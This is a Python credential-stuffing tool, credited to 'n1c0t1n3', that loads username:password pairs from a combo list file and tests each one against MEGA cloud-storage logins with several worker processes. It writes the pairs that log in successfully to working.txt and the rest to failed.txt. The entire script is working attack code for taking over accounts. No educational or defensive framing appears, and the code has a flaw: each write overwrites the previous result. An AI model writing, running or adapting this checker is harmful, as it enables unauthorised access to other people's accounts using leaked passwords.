from mega import Mega
import requests # For making web requests
from multiprocessing import Pool # Multi-Threading
from multiprocessing import freeze_support # Windows Support
import pyfiglet


#Colors
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


accounts = [line.rstrip('\n') for line in open("combo.txt", 'r')]
mega = Mega()


def Credits_and_Version():
    print("\nWritten by")
    print(pyfiglet.figlet_format("n1c0t1n3"))
    print("v1.1")

def IndexSelector():
    global index_null, index_one, criteria
    print("\nPlease select the indexes! Default: 0 and 1 !")
    index_null = 0
    index_one = 1
    criteria = ":"


def checkAccount(account):
    global mega
    try:
        try:
            mega._login_user(account.split(str(criteria))[int(index_null)], account.split(str(criteria))[int(index_one)])
            print(bcolors.OKGREEN + "\n" + account.split(str(criteria))[int(index_null)] + bcolors.ENDC)
            workingfile = open("working.txt", "w+")
            workingfile.write(account + "\n")
            workingfile.close()
        except Exception as e:
            print(bcolors.FAIL + "\n" + account.split(str(criteria))[int(index_null)] + " " + account.split(str(criteria))[int(index_one)] + bcolors.ENDC)
            workingfile = open("failed.txt", "w+")
            workingfile.write(account + "\n")
            workingfile.close()
    except:
        print("\nDONE")


def Threads():
    global numThreads
    numThreads = "5"
    freeze_support()

    pool = Pool(int(numThreads))
    pool.map(checkAccount, accounts)

    pool.close()
    pool.join()



def main():
    Credits_and_Version()
    list_lines = sum(1 for line in open('combo.txt'))
    print("\nTotal accounts: " + str(list_lines))

    IndexSelector()
    Threads()
    

if __name__ == "__main__":
    main()
    
    
